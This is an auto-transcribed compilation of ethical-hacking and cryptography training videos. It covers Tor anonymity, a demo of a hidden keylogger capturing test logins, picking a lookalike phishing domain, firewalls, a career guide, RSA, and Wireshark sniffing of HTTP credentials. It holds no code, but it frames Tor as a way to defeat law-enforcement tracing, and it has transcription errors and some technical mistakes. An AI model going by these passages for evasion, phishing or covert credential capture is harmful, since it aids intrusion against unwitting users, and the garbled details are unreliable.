the countries have a pact where they
share information amongst themselves
even if you're connected to a vpn that
means that these companies that provide
these services have to generate and
store logs and these logs have to be
reported to the government if they ask
for it now if there's a list of 14
countries that actually uh focuses on
this practice so you have to find out
vpn that and a server that is not a part
of those 14 countries and ensure that
those logs are not going to be reported
to the government and these are three
vpns basically are something that which
are good and i personally use cyberghost
i have used the others i just keep on
rotating them just to get an idea of
which one is better so
these are vpns that can allow you to
anonymize yourself on the internet
moving on uh these are the ones that we
talked about there are other safer vpn
hide my ass expressvpn and so on so
forth from our terminologies let's now
talk about vps vps is basically virtual
private server where you can rent a
service or server as a service a virtual
machine as a service so basically on a
cloud using infrastructure as a service
you can rent a server and utilize it for
whatever activity you want so let's go
to uh these sites register.com good id
network solutions or we can talk about
other cloud solutions as well so here
you can get register your domain names
uh so in the previous exercise for let's
say when we talked about the phishing
exercise uh what we want is we can go on
to register.com or we can go on to
godaddy.com and we can purchase a
particular domain for example something
like this instead of the os i'm typing
in a couple of zeros for the facebook
and see let's see if anything of that is
available now something dot photo is
available or
facetips.com is available uh there are
other options that are making over here
that they're giving us over here and
once we purchase this we can then have
our own hosting with our web hosting as
a service and uh you can have a linux
based uh hosting or a windows based
hosting depending on what you want and
that's where your shared hosting comes
with the picture if you just want uh if
you want to look at a virtual server and
you want to rent a server over there
itself you can move on to rackspace.com
and here in your services
you can have physical server or a
virtual server in a public cloud your
other cloud providers for example would
be amazon aws and on aws you can
basically look at ec2 elastic compute
cloud which is basically virtual servers
in the cloud and over here you can rent
out a server with whatever capacity you
require you'll obviously have to pay the
rent for what those servers are going to
cost but once you have those servers you
can then launch any services on top of
it looking at other services that we
have we talked about tar tor is a onion
routing software that allows users to
browse the web anonymously so we can
just go online and we can try to spoof
our identity and i'm going to show you
how so i've got a vmware workstation
right here the one so we're just going
to pull that up and we're going to power
on a windows 7 machine where we are
going to look at the onion routing so
windows machine has booted up we're just
going to log in and this is my windows 7
machine now i've got a chrome browser
right here and we're going to go to a
website called cmyip.com which is going
to give the ip address that i'm
currently using so right now i'm not on
connected to any vpn or anything and you
can see that's my ip address that i'm
utilizing now if i want to anonymize
myself what i'm going to do is i am
going to
use tor and that's the top browser
that's set up right there if i click on
it it's going to open up the software
and it's going to create a new network
and it's going to connect to the tor
network and allow me to anonymize myself
right so that's the third browser
opening up and
giving me a new browser over here so
i've got one which is the old one which
is uh my current ip address if i just
refresh that you'll see that i'm still
on the same ip address as far as this
browser is concerned there's a refresh
and it's still showing me the same ip
address where if i go on to thor right
now and if i go to see my ip.com you
will see that it is going to give me and
you can see the amount of time it is
taking to reach that site that's because
i am using a vpn and there's a lot of
encryption running off and you can see
now i'm certainly connected via hong
kong and even to reach this site what
tor does is it gives me a proxy chain a
proxy chain is where it creates multiple
hops to hide my identity and before i
reach see my ip.com i am using three
different ip addresses over here one in
france one in germany and one in hong
kong so if i do something over here to
trace back my steps to my actual ip
address the law enforcement agencies or
anyone who is going to search like a
forensic investigator would have to go
through these ip addresses before they
come back to me now it's not impossible
but the effort and time that's going to
be taken to come across three different
countries is going to be phenomenal so
it may just defeat the purpose of having
so much resources spent to identify who
did what so that's what torque does for
us all right moving on from tor we are
going to look at keyloggers keyloggers
are basically softwares that run in the
background and record all the keystrokes
of the user so if i've got a keylogger
installed right now whatever i type will
be stored in a text file for the hacker
so that they can look at it later on and
just to give you an example of that we
go back to my vmware workstation and we
open up another windows 7 machine i'm
going to power this on and i'm going to
close this one to them so this virtual
machine has booted up we are going to
use user1 login as user one just close
all these softwares uh which are not
required and once this machine is booted
up what we're going to do is i'm just
going to open up a random websites and
see what we're doing basically there's a
keylogger that's there in the startup
that's going to record our keystrokes
and we just want to see what it actually
does now firefox is getting updated so
let's hold on now this is the latest
version of firefox right and we're just
going to go to let's say facebook.com
wait for the website to open up all
right let's try opening it up again and
that's facebook.com and we're just going
to type in some random username and
password somewhere someone at
somewhere.com and the password being
again asd at the rate one two three four
five six seven eight nine zero log in
obviously that login is not going to
work user probably doesn't exist or if
it does the password probably is
incorrect and uh so we're going to close
this we're going to let's say open up
another browser window go to another
site uh
rediff.com and then go to red if mail
try the same thing over here someone at
somewhere.com
password astrid one two three four five
six seven whatever it is don't say we
can see the combination is incorrect now
there's a keylogger running in the
background and what we want is we now
want to open up the keylogger now it is
visible here because i've kept it
visible you can hide it in the start
menu and there's a shortcut key for you
to pull it up later on so this
completely becomes invisible and
what it can do is it basically creates a
record of whatever you have been doing
so far so you can see these things
populating on the 25th of december so if
i look at the visited website you can
see i opened up mozilla firefox the
first where it there was a problem
loading the page then we opened up
facebook then we opened up
rediffmail.com and so on so forth with
this it just gives me the list of
visited websites whereas if i look at
keystrokes and clipboard you will see
whatever we have typed in so we first
typed in facebook.com then again uh the
second time i
try to type in then i hit backspace then
i type in facebook.com and then you can
see i typed in someone at somewhere.com
and then tab asd at the rate one two
three four five six seven eight nine
zero we closed up the browser we opened
up a new one and we went on to
rediffmail.com and then you can see me
typing this one then going back one
space then the rest of what i typed and
then the password coming in so that's
what a keylogger does if you look at the
taskbar it's not going to show you a
keylogger running in the background it's
in processes you're not going to see
anything at all but it's going to mask
itself as a service so if you look into
the properties you can see that icon
coming in over here which matches this
one and so you can see that this is
masking itself as a service dot exe if
this gets hidden as well it would be
very difficult for a user to even
identify this all right so that's what a
key logger is moving on let's see what
else we want to talk about so we've
talked about tor we have talked about
key
and now we want to talk about firewalls
now for keyloggers to be prevented we
need antiviruses right so we need a good
antivirus program that's going to be
installed updated and run on a regular
basis to protect ourselves from malwares
but what about network connections and
you need a firewall and a system to
prevent or to detect what kind of
connections are going on in the first
place now we cannot rely on software's
100 so even if a firewall is not
configured properly that's that's going
to be a problem so what we need to do is
we have to have a firewall configure it
correctly and then allow and disallow
certain activity from off uh happening
and what we're going to do is i've got
such a system on my machine here i use a
software called glass wire what it does
is it is a network analyzer so it allows
me to analyze whatever is going on you
can see all the apps that i'm utilizing
and how much upload and download they
have been doing all the traffic so you
can see the protocols that i'm utilizing
so i come to know what's going on in the
background and this gives me the entire
graph of how much i have been doing for
the past 24 hours past three hours past
five minutes and so on so forth right so
this is what the activities and these
are the alerts that it has been
generating i can click on those alert
and it will start telling me what it was
all about if the graph doesn't work for
me it gives me usage as well so how much
i have utilized since i've installed
this software right and what
applications have been utilized which
hosts have been connected to and the
traffic type that was utilized and then
the things on my network so these are
the devices that i have currently on my
network that has been that have been
identified and then comes the firewall
so on the firewall the firewall is
clicked on you see all those services
that have been identified and again just
click on a particular service to lock
that service so this becomes a discovery
tool identifies whatever networking is
going on gives me all that information
and then i can look at and i can just
click on any of these services that i
find it as malicious and block them i
can create different profiles for
different applications as i am as and
when i want them and these are the
alerts so you can see that this was the
first time a network connection was
looked at from vmware and what this
allows me to do is whenever i execute a
file it can upload it to virustotal.com
and scan it as a third-party antivirus
to ensure that there is nothing
malicious on it so i already have an
antivirus over here but if this ever
gets compromised i still can rely on a
third party service where in real time
as an and when i execute my applications
uh they would be verified and i would be
assured that nothing is wrong with my
system and this software that i'm
utilizing glass wire basic is free and
then there are paid versions as well
it's just glasswire.com is where you're
going to find this moving on rootkit
rootkits are also malicious softwares
that you allow an unauthorized user to
have access to a computer to restrict
areas of its software now a rootkitten
is a census which a software a malicious
software that infects a machine and
prevents a from some functionality from
it like hiding data or preventing users
from running antiviruses and it's
basically a malicious software that is
used to hide information from the victim
so that they would not realize that they
have actually been compromised it's
going to be a difficult showing of a
root kit so i cannot show that demo to
you so we're just going to move on and
we're going to talk about ethical
hacking techniques now now when we say
ethical hacking techniques we want to
look at what kind of audits are
available when we want to do ethical
hacking so there's a black box audit a
white box audit and a gray box audit so
if i'm invited in an organization to
conduct a test to conduct a audit to
conduct a vulnerability assessment or a
penetration test to identify
vulnerabilities and then try to plug
them out they are going to give me three
different variations in a black box
audit they are not going to tell me
about the infrastructure they are not
going to give me any information and
they want me to start from the basics of
gathering information identifying their
systems and based on the information
that i gather whether i'm able to
develop any hacks and compromise their
infrastructure so it will be a
simulation of a hacker who's sitting
outside the organization and trying to
find a way in whereas a white box audit
is where full infrastructure knowledge
is given anything and everything that is
required for an audit is given and this
is a simulation of an insider attack a
person sitting inside the organization
misusing their permissions and then
trying to compromise trying to get
access to data that they do not have
access to so the simulation is from a
malicious insider a gray box is where
some partial knowledge is available and
from that partial knowledge you're going
to try to build up more information and
then you are going to try to get access
to those resources what are the tools
that we utilize so we have already had a
couple of demos on keyloggers sql
injection sql map and so on so forth
metasploit is a very much used tool for
penetration testing and uh
having knowledge on metasploit is very
much necessary as far as ethical hacking
is concerned nmap this is a tool used
for network discovery necessary scanner
wireshark is a packet capturer that
allows you to capture packets and
analyze whatever is going on sql map is
something that we have seen a sequel
injection attack tool which generates
its own queries and john the ripper is a
password cracking tool
bactrack used to be an operating system
that was utilized for penetration
testing however backtrack has now been
replaced by something called kali linux
and that's the operating system that we
have utilized in all our demos where we
tried to look at sql map and those
injection attacks that we did so what
are the areas of ethical hacking we have
just talked about all these areas as
well network services we looked at the
glasswire application that showed us how
my machine is consuming networks which
protocols are being consumed how the
connections are being uh created if
somebody's able to install a trojan on
my machine it is going to try to create
a new connection on the network with the
hacker to allow that hacker a backdoor
access now if i have that glass wire or
a similar firewall implemented it is
this wire wall that is going to detect
it and prevent that connection from
happening so if i install a software
that is certainly suspicious or that
install something else in the background
that i may not be aware of that tool is
going to identify all the connections
that are being made and it is going to
highlight that connection i need to go
through all of those connections and
identify whether they are legit or not
and if i find some suspicious or
doubtful i'm going to block that
connection and then i'm going to
investigate what's going on and that's
where ethical hacking comes into the
picture you want to find out if your
firewall that you have implemented is
going to work correctly or not if the
configuration of the firewall is done
properly or if the firewall is
misconfigured is it leaking out
information right at the same time
you're looking at web applications we
looked at the ovas broken web
application where we did some sql
injection attacks right so that was a
weakness or a vulnerability in that
application which would allow us to
bypass authentication and get access uh
to resources that you are not authorized
for and then client-side attack should
be where uh you install keylogger at the
end of the at the client system and then
you try to capture whatever data the uh
user is typing in like usernames and
passwords on the facebook and the rediff
mail.com website that we saw and then
try to misuse that information to get
access to those resources then wi-fi
networks right wi-fi is something that
we use on a regular basis we got our
smart devices nowadays smartphones
tablets phablets that we can connect to
wi-fi and start using all our services
our banking applications and our
smartphones and thus we want to ensure
that wireless connectivity is simple and
is secure so you want to use encryption
mechanisms you want to use tools on your
smartphones anti-viruses firewalls on
your smartphones to ensure that whatever
you're utilizing is going to remain
secure and then social engineering we've
looked at the phishing website on
facebook.com we've seen how easy it is
to clone websites and
host them on apache server so if you
look at a it has a from ethical hackers
perspective the job of ethical hacker is
to simulate these kind of attacks that
the hacker may conduct and uh first of
all you're basically going to find out
areas where these attacks can happen
think of it from a hacker's perspective
try to simulate those attacks and see if
those attacks are going to be effective
can those attacks be prevented and can
your current security controls that you
have put in place identify detect and
prevent these attacks from happening in
the first place and that is what ethical
hacking is all about with the increase
in the number of cyber crimes across the
globe there is also an increase in the
number of cyber security jobs and the
role of an ethical hacker tops the list
hi guys this is shruti from simply learn
and today i will run you through this
video on ethical hacking career so let's
get started and explore the world of
ethical hacking let's begin with a few
facts did you know that by the year 2021
there will be 3.5 million cyber security
job openings that is a huge number isn't
it and also according to the us bureau
of labor statistics there will be 20
percent increase in the number of jobs
from 2016 to 2026 for information
security analysts which includes ethical
hackers this proves that there is a
great demand for ethical hackers at the
moment as i mentioned earlier the number
of cyber crimes across the world will
increase as the digital era will only
continue to grow organizations will be
on the lookout to hire professionals who
can fight these cyber crimes and protect
the company's data and to fight these
cyber crimes we will require individuals
who can think like a hacker and who is
that well to do this job we have ethical
hackers as you might be knowing an
ethical hacker is trained to discover
system vulnerabilities an ethical hacker
is also known as a white hat hacker he
or she is given authorization from the
company to perform security assessments
and at the end an ethical hacker would
have to report the findings back to the
company so that the vulnerabilities can
be fixed an ethical hacker performs
these security assessments with the help
of various hacking techniques and tools
let's now move on to our next topic that
is the steps to become an ethical hacker
you might wonder how to start your
ethical hacking career right well i will
take you through that step by step
firstly the candidate must have a
computer science or an information
technology bachelor's degree it is also
possible to become an ethical hacker
without these degrees but provided you
have the required skill sets and
experience the next requirement to be an
ethical hacker is that the candidate
must have a minimum of two years of
experience in the information security
field you have to start your career with
a software or a networking job and only
then can you move on to the ethical
hacking field you have to start your
career with a software or a networking
job and only then can you move into the
ethical hacking field coming to the
certifications it is necessary for the
candidate to hold various cyber security
certifications certifications play a
vital role in the field of cyber
security your job opportunities can
solely depend on these certifications to
become an ethical hacker you can start
off with the foundational level
certifications such as the ccna and
comptria security plus certifications
finally the last step to become an
ethical hacker is to clear the certified
ethical hacker examination ch
certification is provided by the ec
council it trains the candidate to
protect a company's network by using the
same tools and methods that a hacker
would use the ch exam will have a
duration of 4 hours with 125 number of
questions if the candidate clears this
exam then he or she will become a
certified ethical hacker now that you
know the steps to become an ethical
hacker let's look into the skill sets
which are required to help you achieve
these steps first and foremost an
ethical hacker needs to have an in-depth
knowledge of the working of the
operating systems knowledge of windows
linux and macintosh operating systems is
required for penetration testing
creating exploits and bug hunting
programming will be important so
knowledge of programming languages such
as cec plus plus html python and php
will be very helpful basic knowledge of
networking tcp protocols and osi model
is necessary as networking is the
foundation of cyber security for
securing databases knowledge of sql
nosql postgresql is necessary
cryptography is used to secure
information it is the process of
converting data from a readable format
to a non-readable format and vice versa
cryptanalysis is decryption without a
secret key in most cases certified
ethical hacker would need to perform
cryptanalysis hence ethical hacker has
to be comfortable with cryptography and
cryptanalysis ethical hackers should be
proficient in network security control
measures such as intrusion detection and
intrusion prevention techniques now
let's move on to the responsibilities
which are taken care of by an ethical
hacker let's have a look at these
responsibilities an ethical hacker is
responsible for scanning systems open
and closed ports using tools like nessus
and nmap vulnerabilities and threats are
identified by doing this in addition to
scanning for vulnerabilities they also
search the deep corners of the network
to spot critical information such as
passwords which can make the
organization vulnerable to an attack in
addition to building and maintaining ids
ips and firewalls they also try to evade
these security measures to gauge the
performance of the systems a lot of
times a company's online fraud or online
theft incidents are looked into by an
ethical hacker an ethical hacker also
checks for sniffing networks and
hijacked web servers and applications
those were the responsibilities of an
ethical hacker now let's look into the
various job roles an ethical hacker can
apply for it is a misconception that an
ethical hacker will perform only
penetration testing well there are a
number of other jobs an ethical hacker
can apply for the different job roles
such as that of a penetration tester
information security analyst security
consultant and an information security
manager let's have a look at each of
these job roles one by one a penetration
tester performs the typical
responsibility of an ethical hacker that
is he or she tries to exploit a security
system's vulnerabilities this is carried
out using different hacking tools and
techniques an ethical hacker can also
apply for the role of an information
security analyst there is a difference
between the job roles of a penetration
tester and that of an information
security analyst here the candidate will
be required to primarily design and
protect the organization's network from
various cyber attacks finally the
candidate is also required to document
the identified security breaches so that
it can be omitted the next time the
responsibilities of a security
consultant is more or less similar to
that of an information security analyst
that we saw previously as a security
consultant you will be responsible to
design implement and maintain barrier
security architectures in addition to
this you're also required to upgrade the
security systems as and when required
finally an ethical hacker can also apply
to the role of an information security
manager as the name suggests this role
will require the candidate to possess
managerial skills as an information
security manager is responsible to head
the it and the information security team
now that we have seen the
responsibilities the skills and the
steps to become an ethical hacker let's
have a look at the different companies
hiring ethical hackers to name a few we
have bank of america ernest and young
kpmg urban pro and ibm let's now look
into the salary structure of an ethical
hacker well in india the average annual
salary of a certified ethical hacker is
nearly 4 lakhs 76 000 rupees and in the
us the average annual salary of a
certified ethical hacker is 91 000
now i will guide you through a sample
resume of a penetration tester as you
can see on your screens this is a sample
resume of a penetration tester we will
look into this resume closely and
understand how your resume should look
like if you are applying for the role of
a penetration tester as always you can
start off with your name and your email
id and your phone number followed by a
brief summary of your current job
profile it is prefer to add your
linkedin profile link here and also your
github profile link if you have one as i
mentioned earlier this is a sample
resume for a penetration tester and
hence we have to have more than two
years of experience in the information
security field as you can see under the
experience section the candidate has two
prior experiences out of which the first
experience is that of a software tester
and second is that of a penetration
tester you would have to mention your
latest or current experience at the
beginning you can mention your job role
and the company and the duration under
which you can list out the various
responsibilities that you are looking
into currently if you are a penetration
tester you can mention responsibilities
such as security monitoring black box
testing documentation of the results
vulnerability scanning and so on below
this you can mention your first
company's experience with the roles and
responsibilities that you have performed
earlier here the candidate was a
software tester before becoming a
penetration tester let's move on to the
education section here the candidate
holds a bachelor's degree in computer
science you can mention your degree
followed by the university name or if
you're applying for any other role in
the cyber security domain it is
recommended that you list out the
certifications as well to start off with
a ccna certification will be preferred
followed by a certified ethical hacker
certification which is a must if you are
applying for the role of a penetration
tester in addition to it the certified
expert penetration tester certification
will also hold a great advantage after
mentioning the certifications you can go
ahead and mention your skill sets here
we have the technical skills and
non-technical skills under technical
skills you can mention the programming
languages that you know here we have c c
plus plus java perl you can also mention
the operating systems that you have
worked on for example windows linux unix
and in addition to the programming
languages and the os you can also
mention the tools that you know such as
nmap metasploit tools which will be
helpful if you are applying for the role
of a penetration tester then you can
also mention encryption technologies
knowledge of sql and bug tracking
systems if you have worked on them
before if you have participated in a
code authored you can mention that here
as well under the non-technical skills
you can mention various competitions
that you have taken part in and the
games that you like and other
extracurricular activities finally you
can also mention the projects undertaken
under the projects undertaken you can
talk about the various projects that you
have performed in your company or
outside the company here we have two
projects one as a software test engineer
and second one as a penetration tester
so this is how a resume of a penetration
tester will look like choose from over
300 in-demand skills and get access to 1
000 plus hours of video content for free
visit skill up by simply learn click on
the link in the description to know more
with the ryzen censorship and general
fear over privacy loss consumer security
is at an all-time high risk technology
has made our life so much easier while
putting up a decent target on our
personal information it is necessary to
understand how to simultaneously
safeguard our data
and be up to date with the latest
technological developments maintaining
this balance has become easier with
cryptography taking its place in today's
digital world so here's a story to help
you understand cryptography meet anne
anne wanted to look for a decent
discount on the latest iphone she
started searching on the internet and
found a rather shady website that
offered a 50 discount on the first
purchase
once and submitted her payment details a
huge chunk of money was withdrawn from a
bank account just moments after
devastated and quickly realized she had
failed to notice that the website was a
http web page instead of an https one
the payment information submitted was
not encrypted and it was visible to
anyone keeping an eye including the
website owner and hackers had she used a
reputed website which has encrypted
transactions and employs cryptography
our iphone enthusiasts could have
avoided this particular incident
this is why it's never recommended to
visit unknown websites or share any
personal information on them let's now
understand what cryptography is
cryptography is the science of
encrypting or decrypting information to
prevent unauthorized access we transform
our data and personal information so
that only the correct recipient can
understand the message as an essential
aspect of modern data security using
cryptography allows the secure storage
and transmission of data between willing
parties
encryption is the primary route for
employing cryptography by adding certain
algorithms to jumble up the data
decryption is the process of reversing
the work done by encrypting information
so that the data becomes readable again
both of these methods form the basis of
cryptography
for example when simply learn is jumbled
up or changed in any format not many
people can guess the original word by
looking at the encrypted text
the only ones who can are the people who
know how to decrypt the coded word
thereby reversing the process of
encryption
any data pre-encryption is called plain
text or clear text to encrypt the
message we use certain algorithms that
serve a single purpose of scrambling the
data to make them unreadable without the
necessary tools these algorithms are
called ciphers
they are a set of detailed steps to be
carried out one after the other to make
sure the data becomes as unreadable as
possible until it reaches the receiver
we take the plain text pass it to the
cipher algorithm and get the encrypted
data this encrypted text is called the
ciphertext and this is the message that
is transferred between the two parties
the key that is being used to scramble
the data is known as the encryption key
these steps that is the cipher and the
encryption key are made known to the
receiver who can then reverse the
encryption on receiving the message
unless any third party manages to find
out both the algorithm and the secret
key that is being used they cannot
decrypt the messages since both of them
are necessary to unlock the hidden
content
wonder what else we would lose if not
for cryptography
any website where you have an account
can read your passwords important emails
can be intercepted and their contents
can be read without encryption during
the transit
more than 65 billion messages are sent
on whatsapp every day all of which are
secured thanks to end to end encryption
there is a huge market opening up for
cryptocurrency which is possible due to
blockchain technology that uses
encryption algorithms and hashing
functions to ensure that the data is
secure if this is of particular interest
to you you can watch our video on
blockchain the link of which will be in
the description
of course there is no single solution to
a problem as diverse as explained there
are three variants of how cryptography
works and is in practice
they are
symmetric encryption
asymmetric encryption
and hashing
let's find out how much we have
understood until now do you remember the
difference between a cipher and
ciphertext
leave your answers in the comments and
before we proceed if you find this video
interesting make sure to give it a
thumbs up before moving ahead
let's look at symmetric encryption first
symmetric encryption uses a single key
for both the encryption and decryption
of data it is comparatively less secure
than asymmetric encryption but much
faster
it is a compromise that has to be
embraced in order to deliver data as
fast as possible without leaving
information completely vulnerable
this type of encryption is used when
data rests on servers and identifies
personnel for payment applications and
services
the potential drawback with symmetric
encryption is that both the sender and
receiver need to have the same secret
key and it should be kept hidden at all
times
caesar cipher enigma machine are both
symmetric encryption examples that we
will look into further
for example
if alice wants to send a message to bob
she can apply a substitution cipher or a
shift cipher to encrypt the message but
bob must be aware of the same key itself
so he can decrypt it when he finds it
necessary to read the entire message
symmetric encryption uses one of the two
types of ciphers stream ciphers and
block ciphers
block ciphers break the plain text into
blocks of fixed size and use the key to
convert it into ciphertext
stream ciphers convert the plain text
into ciphertext one bit at a time
instead of resorting to breaking them up
into bigger chunks
in today's world the most widely used
symmetric encryption algorithm is aes
256 that stands for advanced encryption
standard which has a key size of 256 bit
with 128 bit and 196 bit key sizes also
being available other primitive
algorithms like the data encryption
standard that is the des the triple data
encryption standard 3des and blowfish
have all fallen out of favor due to the
rise of aes
aes chops ups the data into blocks and
performs 10 plus rounds of obscuring and
substituting the message to make it
unreadable
asymmetric encryption on the other hand
has a double whammy at its disposal
there are two different keys at play
here a public key and a private key the
public key is used to encrypt
information pre-transit and a private
key is used to decrypt the information
post transit if alice wants to
communicate with bob using asymmetric
encryption
she encrypts the message using bob's
public key
after receiving the message bob uses his
own private key to decrypt the data this
way nobody can intercept the message in
between transmissions and there is no
need for any secure key exchange for
this to work since the encryption is
done with the public key and the
decryption is done with a private key
that no one except bob has access to
both the keys are necessary to read the
full message
there is also a reverse scenario where
we can use the private key for
encryption and the public key for
decryption
a server can sign non-confidential
information using its private key and
anyone who has its public key can
decrypt the message
this mechanism also proves that the
sender is authenticated and there is no
problem with the origin of the
information
rsa encryption is the most widely used
asymmetric encryption standard
it is named after its founders revest
shamir and edelman and it uses block
ciphers that separate the data into
blocks and obscure the information
widely considered the most secure form
of encryption albeit relatively slower
than aes it is widely used in web
browsing secure identification vpns
emails and chat applications
with so much hanging on the key secrecy
there must be a way to transmit the keys
without others reading our private data
many systems use a combination of
symmetric encryption and asymmetric
encryption to bolster security and match
speed at the same time
since asymmetric encryption takes longer
to decrypt large amounts of data the
full information is encrypted using a
single key that is symmetric encryption
that single key is then transmitted to
the receiver using asymmetric encryption
so you don't have to compromise either
way another route is using the
diffie-hellman key exchange which relies
on a one-way function and is much
tougher to break into
the third variant of cryptography is
termed as hashing
hashing is the process of scrambling a
piece of data beyond recognition it
gives an output of fixed size which is
known as the hash value of the original
data or just hash in general
the calculations that do the job of
messing up the data collection from the
hash function
they are generally not reversible
without resilient brute force mechanisms
and are very helpful when storing data
on website servers that need not be
stored in plain text for example many
websites store your account passwords in
a hashed format so that not even the
administrator can read your credentials
when a user tries to log in they can
compare the entered passwords hash value
with the hash value that is already
stored on the servers for authentication
since the function will always return
the same value for the same input
cryptography has been in practice for
centuries
julius caesar used a substitution shift
to move alphabets a certain number of
spaces beyond their place in the
alphabet table
a spy can't decipher the original
message at first glance for example if
he wanted to pass confidential
information to his armies and decides to
use the substitution shift of plus two a
becomes c b becomes d and so on the word
attack when passed through a
substitution shift of plus three becomes
d w w d e f n
this cipher has been appropriately named
the caesar cipher which is one of the
most widely used algorithms
the enigma is probably the most famous
cryptographic cipher device used in
ancient history
it was used by the nazi german armies in
the world wars they were used to protect
confidential political
military and administrative information
and it consisted of three or more rotors
that scrambled the original message
depending on the machine state at that
time
the decryption is similar but it needs
both machines to stay in the same state
before passing the cipher text so that
we received the same plain text message
let's take a look at how our data is
protected while we browse the internet
thanks to cryptography here we have a
web-based tool that will help us
understand the process of rsa encryption
we see the entire workflow from
selecting the key size to be used until
the decryption of the cipher text in
order to get the plain text back
as we already know rsa encryption
algorithm falls under the umbrella of
asymmetric key cryptography
that basically implies that we have two
keys at play here a public key and a
private key
typically the public key is used by the
sender to encrypt the message and the
private key is used by the receiver to
decrypt the message
there are some occasions when this
allocation is reversed and we will have
a look at them as well
in rsa we have the choice of key size we
can select any key from a 512 bit to
1024 bit all the way up to a 4096 bit
key the longer the key length the more
complex the encryption process becomes
and thereby strengthening the cipher
text
although with added security more
complex functions take longer to perform
the same operations on similar size of
data we have to keep a balance between
both speed and strength because the
strongest encryption algorithms are of
no use if they cannot be practically
deployed in systems around the world
let's take a 1024 bit key over here
now we need to generate the keys
this generation is done by functions
that operate on pass phrases the tool we
are using right now generates these
pseudorandom keys to be used in this
explanation
once we generate the keys you can see
the public key is rather smaller than
the private key which is almost always
the case
these two keys are mathematically linked
with each other
they cannot be substituted with any
other key and in order to encrypt the
original message or decrypt the cipher
text this pair must be kept together the
public key is then sent to the sender
and the receiver keeps the private key
with himself
in this scenario let's try and encrypt a
word simply learn
we have to select if the key being used
for encryption is either private or
public since that affects the process of
scrambling the information since we are
using the public key over here let's
select the same
and copy it and paste over here
the cipher we are using right now is
plain rsa there are some modified
ciphers with their own pros and cons
that can also be used provided we use it
on a regular basis and depending on the
use case as well
once we click on encrypt we can see the
ciphertext being generated over here
the pseudorandom generating functions
are created in such a way that a single
character change in the plaintext will
trigger a completely different
ciphertext this is a security feature to
strengthen the process from brute force
methods
now that we are done with the encryption
process let's take a look at the
decryption part
the receiver gets this cipher text from
the sender with no other key or
supplement
he or she must already possess the
private key generated from the same pair
no other private key can be used to
decrypt the message since they are
mathematically linked
we paste the private key here and select
the same
the cipher must always so be the same
used during the encryption process
once we click decrypt you can see the
original plain text we had decided to
encrypt this sums up the entire process
of rsa encryption and decryption
now some people use it the other way
around we also have the option of using
the private key to encrypt information
and the public key to decrypt it this is
done mostly to validate the origin of
the message since the keys only work in
pairs if a different private key is used
to encrypt the message the public key
cannot decrypt it conversely if the
public key is able to decrypt the
message it must have been encrypted with
the right private key and hence the
rightful owner
here we just have to take the private
key
and use that to encrypt the plain text
and select the same in this checkbox as
well
you can see we have generated a
completely new ciphertext
this ciphertext will be sent to the
receiver and this time we will use the
public key for decryption
let's select the correct checkbox and
decrypt
and we still get the same output
now let's take a look at practical
example of encryption in the real world
we all use the internet on a daily basis
and many are aware of the implications
of using unsafe websites
let's take a look at wikipedia here
pretty standard https website where the
h stands for secured
let's take a look at how it secures that
data
wireshark is the world's foremost and
most widely used network protocol
analyzer it lets you see what's
happening on your network at a
microscopic level
and we are going to use the software to
see the traffic that is leaving our
machine and to understand how vulnerable
it is
since there are many applications
running in this machine let's apply a
filter that will only show us the
results related to wikipedia
[Music]
let's search for something that we can
navigate the website with
okay once we get into it a little you
can see some of the requests being
populated over here
let's take a look at the specific
request
these are the data packets that
basically transport the data from our
machine to the internet and vice versa
as you can see there's a bunch of
gibberish data here that doesn't really
reveal anything that we searched or
watched
similarly other secured websites
function the same way and it is very
difficult if at all possible to snoop on
user data this way
to put this in perspective
let's take a look at another website
which is a http web page
this has no encryption enabled from the
server end which makes it vulnerable to
attacks
there is a login form here which needs
legitimate user credentials in order to
grant access
let's enter a random pair of credentials
these obviously won't work but we can
see the manner of data's transfer
unsurprisingly we weren't able to get
into the platform
instead we can see the data packets
let's apply a similar filter that will
help us understand
what request this website is sending
these are the requests being sent by the
http login form to the internet if we
check here
see whatever username and password that
we are entering we can easily see it
with the wireshark
now we used a dummy pair of credentials
if we select the right data packet we
can find our correct credentials
if any website had asked for a payment
information or a legitimate credentials
it would have been really easy to get a
hold of these
to reiterate what we have already
learned we must always avoid http
websites and just unknown or not
trustworthy websites in general because
the problem we saw here is just the tip
of the iceberg even though cryptography
has managed to lessen the risk of cyber
attacks it is still prevalent and we
should always be alert to keep ourselves
safe online
there are two types of encryption in
cryptography
symmetric key cryptography
and asymmetric key cryptography
both of these categories have their pros
and cons and differ only by the
implementation
today we are going to focus exclusively
on symmetric key cryptography
let us have a look at its applications
in order to understand its importance
better this variant of cryptography is
primarily used in banking applications
where personally identifiable
information needs to be encrypted with
so many aspects of banking moving on to
the internet having a reliable safety
net is crucial symmetric cryptography
helps in detecting bank fraud and boosts
the security index of these payment
gateways in general
they are also helpful in protecting data
that is not in transit and dress on
servers and data centers these centers
house a massive amount of data that
needs to be encrypted with a fast and
efficient algorithm so that when the
data needs to be recalled by the
respective service there is the
assurance of minor to no delay
while browsing the internet we need
symmetric encryption to browse secure
https websites so that we get an
all-around protection it plays a
significant role in verifying website
server authenticity exchanging the
necessary encryption is required and
generating a session using those keys to
ensure maximum security
this helps us in preventing the rather
insecure http website format
so let us understand how symmetric key
cryptography works first before moving
on to the specific algorithms
symmetric key cryptography relies on a
single key for the encryption and
decryption of information
both the sender and receiver of the
message need to have a pre-shared secret
key that they will use to convert the
plain text into ciphertext and vice
versa
as you can see in the image the key used
for encryption is the same key needed
for decrypting the message at the other
end the secret key shouldn't be sent
along with the cipher text to the
receiver because that would defeat the
entire purpose of using cryptography
key exchange can be done beforehand
using other algorithms like the
diffie-hellman key exchange protocol for
example
for example if paul wants to send a
simple message to jane they need to have
a single encryption key that both of
them must keep secret to prevent
snooping on by malicious actors
it can be generated by either one of
them but must belong to both of them
before the messages start flowing
suppose the message i am ready is
converted into ciphertext using a
specific substitution cipher by paul
in that case jane must also be aware of
the substitution shift to decrypt the
ciphertext once it reaches her
irrespective of the scenario where
someone manages to grab the ciphertext
mid transit to try and read the message
not having the secret key renders
everyone helpless looking to snoop in
the symmetric key algorithms like the
data encryption standard have been in
use since the 1970s while the popular
ones like the ees have become the
industry standard today
with the entire architecture of
symmetric cryptography depending on the
single key being used you can understand
why it's of paramount importance to keep
it secret on all locations
the side effect of having a single key
for the encryption and decryption is it
becomes a single point of failure anyone
who gets their hand on it can read all
the encrypted messages and do so mainly
without the knowledge of the sender and
the receiver
so it is the priority to keep the
encryption and decryption key private at
all times
should it fall into the wrong hands the
third party can send messages to either
the sender or the receiver using the
same key to encrypt the message
upon receiving the message and
decrypting it with the key it is
impossible to guess its origin
